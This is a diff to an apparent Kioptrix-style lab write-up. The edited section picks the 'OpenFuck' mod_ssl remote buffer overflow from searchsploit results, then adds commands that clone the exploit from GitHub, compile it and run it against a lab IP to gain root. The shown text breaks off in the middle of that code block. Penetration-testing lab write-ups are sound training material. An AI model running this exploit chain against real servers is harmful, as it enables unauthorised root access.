@@ -124,12 +124,21 @@ Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
 ```
-Ignoring all the exploits that don't apply to this particular software setup (aka Tomcat/Struts etc) there are only a couple of ones worth looking at. One that applies very closely to the machine are the "Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow" exploits, as the server is running mod_ssl 2.8.4, and searching for this version online confirms it is vulnerable.
+Ignoring all the exploits that don't apply to this particular software setup or situation (aka Tomcat/Struts/local/DoS etc) there are only a couple of ones worth looking at. One that applies very closely to the machine are the "Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow" exploits, as the server is running mod_ssl 2.8.4, and searching for this version online confirms it is vulnerable.
 
-3. Set up the exploit
+### 3. Set up the exploit
+Clone the latest version of the exploit and compile it.
+```bash
+kali@kali:~/Desktop/osc/kiol1$ git clone https://github.com/heltonWernik/OpenFuck.git
+Cloning into 'OpenFuck'...
+remote: Enumerating objects: 26, done.
+remote: Total 26 (delta 0), reused 0 (delta 0), pack-reused 26
+Unpacking objects: 100% (26/26), 14.12 KiB | 314.00 KiB/s, done.
+kali@kali:~/Desktop/kiol1$ cd OpenFuck/
+kali@kali:~/Desktop/kiol1/OpenFuck$ gcc OpenFuck.c -o OpenFuck -lcrypto
+```
 
-
-4. Get to root
+### 4. Get to root
 The exploit had been updated, but was still fairly unreliable and I had to run it a few times before it worked.
 ```bash
 kali@kali:~/Desktop/osc/kiol1/OpenFuck$ ./OpenFuck 0x6b 10.1.1.63 443 -c 50
